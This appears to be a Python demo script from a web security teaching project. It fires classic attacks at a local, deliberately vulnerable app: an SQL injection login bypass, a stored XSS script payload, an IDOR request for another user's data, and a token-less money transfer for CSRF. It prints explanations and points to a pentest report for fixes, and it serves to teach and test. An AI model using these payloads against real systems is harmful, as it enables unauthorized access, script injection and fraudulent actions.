#!/usr/bin/env python3
"""
Demo script showing web security vulnerabilities
"""

import requests
import time

BASE_URL = 'http://localhost:5000'

def demo_vulnerabilities():
    """Demonstrate the main vulnerabilities"""

    print("🔐 WEB SECURITY VULNERABILITIES DEMO")
    print("=" * 50)

    # Wait for app to start and test connection
    print("⏳ Waiting for web application to start...")
    max_attempts = 10
    for attempt in range(max_attempts):
        try:
            response = requests.get(f'{BASE_URL}/', timeout=5)
            if response.status_code == 200:
                print("✅ Web application is running!")
                break
        except requests.exceptions.RequestException as e:
            print(f"⏳ Attempt {attempt + 1}/{max_attempts}: Cannot connect ({e})")
            time.sleep(2)
    else:
        print("❌ Cannot connect to web application")
        print("💡 Make sure the app is running: cd app && python app.py")
        return

    try:
        # Test 1: SQL Injection
        print("\n1️⃣ Testing SQL Injection (Authentication Bypass)")
        print("-" * 40)

        sqli_payload = "' OR '1'='1' --"
        data = {'username': sqli_payload, 'password': 'anything'}

        print(f"Payload: {sqli_payload}")
        response = requests.post(f'{BASE_URL}/login', data=data, allow_redirects=False)

        if response.status_code == 302:  # Redirect to dashboard = login success
            print("✅ SQL Injection SUCCESSFUL - Authentication bypassed!")
            print("💡 This allows attackers to login without valid credentials")
        else:
            print("❌ SQL Injection failed")

        # Test 2: XSS
        print("\n2️⃣ Testing Cross-Site Scripting (XSS)")
        print("-" * 40)

        # First login normally
        session = requests.Session()
        login_data = {'username': 'user1', 'password': 'pass1'}
        response = session.post(f'{BASE_URL}/login', data=login_data)

        if 'dashboard' in response.url:
            print("✅ Logged in successfully")

            # Post XSS payload
            xss_payload = '<script>alert("XSS Attack!")</script><h1>HACKED</h1>'
            post_data = {'content': xss_payload}
            response = session.post(f'{BASE_URL}/post', data=post_data)

            # Check if XSS is reflected
            response = session.get(f'{BASE_URL}/dashboard')
            if xss_payload in response.text:
                print("✅ XSS SUCCESSFUL - Malicious script injected!")
                print("💡 This allows attackers to execute JavaScript in victims' browsers")
                print(f"Payload reflected: {xss_payload[:50]}...")
            else:
                print("❌ XSS failed")
        else:
            print("❌ Login failed for XSS test")

        # Test 3: IDOR
        print("\n3️⃣ Testing Insecure Direct Object References (IDOR)")
        print("-" * 40)

        if session.cookies:  # If we have a session
            # Try to access admin posts (user_id=1)
            response = session.get(f'{BASE_URL}/dashboard?user_id=1')

            if 'admin' in response.text.lower():
                print("✅ IDOR SUCCESSFUL - Accessed other user's private data!")
                print("💡 This allows users to view data they're not authorized to see")
            else:
                print("❌ IDOR test inconclusive (may need manual verification)")
        else:
            print("❌ No session available for IDOR test")

        # Test 4: CSRF
        print("\n4️⃣ Testing Cross-Site Request Forgery (CSRF)")
        print("-" * 40)

        if session.cookies:
            # Attempt CSRF attack (transfer money without token)
            csrf_data = {'amount': '1000', 'to_user': '999'}
            response = session.post(f'{BASE_URL}/transfer', data=csrf_data)

            if 'Transferred' in response.text:
                print("✅ CSRF SUCCESSFUL - Unauthorized money transfer!")
                print("💡 This allows attackers to perform actions on behalf of users")
            else:
                print("❌ CSRF failed (may be protected)")
        else:
            print("❌ No session available for CSRF test")

        print("\n" + "=" * 50)
        print("🎯 DEMO COMPLETE!")
        print("\n📋 SUMMARY:")
        print("• SQL Injection: Allows authentication bypass")
        print("• XSS: Enables JavaScript execution in victims' browsers")
        print("• IDOR: Permits unauthorized data access")
        print("• CSRF: Allows unauthorized state-changing actions")
        print("\n📖 Check docs/pentest_report.md for detailed remediation steps")

    except requests.exceptions.ConnectionError:
        print("❌ Cannot connect to web application")
        print("💡 Make sure the app is running: cd app && python app.py")
    except Exception as e:
        print(f"❌ Error during demo: {e}")

if __name__ == '__main__':
    demo_vulnerabilities()